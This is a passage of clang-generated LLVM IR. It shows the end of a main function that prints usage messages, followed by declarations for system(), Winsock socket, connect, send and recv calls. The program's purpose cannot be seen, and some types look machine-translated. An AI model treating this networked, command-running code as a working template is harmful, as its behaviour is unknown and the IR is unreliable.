  %435 = getelementptr inbounds i8*, i8** %434, i64 0
  %436 = load i8*, i8** %435, align 8
  %437 = call i32 (i32, i8*, ...) @fprintf(i32 %433, i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.22, i64 0, i64 0), i8* %436)
  %438 = load i32, i32* @stderr, align 4
  %439 = call i32 (i32, i8*, ...) @fprintf(i32 %438, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.23, i64 0, i64 0))
  %440 = load i32, i32* @stderr, align 4
  %441 = call i32 (i32, i8*, ...) @fprintf(i32 %440, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.24, i64 0, i64 0))
  %442 = load i32, i32* @stderr, align 4
  %443 = call i32 (i32, i8*, ...) @fprintf(i32 %442, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.25, i64 0, i64 0))
  %444 = load i32, i32* @stderr, align 4
  %445 = call i32 (i32, i8*, ...) @fprintf(i32 %444, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.26, i64 0, i64 0))
  %446 = load i32, i32* @stderr, align 4
  %447 = call i32 (i32, i8*, ...) @fprintf(i32 %446, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.27, i64 0, i64 0))
  %448 = load i32, i32* @stderr, align 4
  %449 = call i32 (i32, i8*, ...) @fprintf(i32 %448, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.28, i64 0, i64 0))
  %450 = load i32, i32* @stderr, align 4
  %451 = call i32 (i32, i8*, ...) @fprintf(i32 %450, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.29, i64 0, i64 0))
  %452 = load i32, i32* @stderr, align 4
  %453 = call i32 (i32, i8*, ...) @fprintf(i32 %452, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.30, i64 0, i64 0))
  %454 = load i32, i32* @stderr, align 4
  %455 = call i32 (i32, i8*, ...) @fprintf(i32 %454, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.31, i64 0, i64 0))
  %456 = load i32, i32* @stderr, align 4
  %457 = call i32 (i32, i8*, ...) @fprintf(i32 %456, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.32, i64 0, i64 0))
  %458 = load i32, i32* @stderr, align 4
  %459 = call i32 (i32, i8*, ...) @fprintf(i32 %458, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.33, i64 0, i64 0))
  %460 = load i32, i32* @stderr, align 4
  %461 = call i32 (i32, i8*, ...) @fprintf(i32 %460, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.34, i64 0, i64 0))
  %462 = load i32, i32* @stderr, align 4
  %463 = call i32 (i32, i8*, ...) @fprintf(i32 %462, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.35, i64 0, i64 0))
  %464 = load i32, i32* @stderr, align 4
  %465 = call i32 (i32, i8*, ...) @fprintf(i32 %464, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.36, i64 0, i64 0))
  %466 = load i32, i32* @stderr, align 4
  %467 = call i32 (i32, i8*, ...) @fprintf(i32 %466, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.37, i64 0, i64 0))
  %468 = load i32, i32* @stderr, align 4
  %469 = load i8**, i8*** %5, align 8
  %470 = getelementptr inbounds i8*, i8** %469, i64 0
  %471 = load i8*, i8** %470, align 8
  %472 = call i32 (i32, i8*, ...) @fprintf(i32 %468, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.38, i64 0, i64 0), i8* %471)
  %473 = load i32, i32* @stderr, align 4
  %474 = load i8**, i8*** %5, align 8
  %475 = getelementptr inbounds i8*, i8** %474, i64 0
  %476 = load i8*, i8** %475, align 8
  %477 = call i32 (i32, i8*, ...) @fprintf(i32 %473, i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.39, i64 0, i64 0), i8* %476)
  br label %478

478:                                              ; preds = %432, %431
  %479 = load i32, i32* @stdout, align 4
  %480 = call i32 (i32, i8*, ...) @fprintf(i32 %479, i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.40, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  %481 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %481)
  %482 = load i32, i32* %3, align 4
  ret i32 %482
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @system(i8*) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i64 @WSAStartup(i32, i32*) #2

declare dso_local i32 @MAKEWORD(i32, i32) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @inet_addr(i8*) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @memset(i32*, i32, i32) #2

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @recv(i32, i8*, i32, i32) #2

declare dso_local i32* @strstr(i8*, i32) #2

declare dso_local i64 @malloc(i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @strncmp(i8*, i8*, i32) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @free(i8*) #2

declare dso_local i32 @closesocket(i32) #2

declare dso_local i32 @WSACleanup(...) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
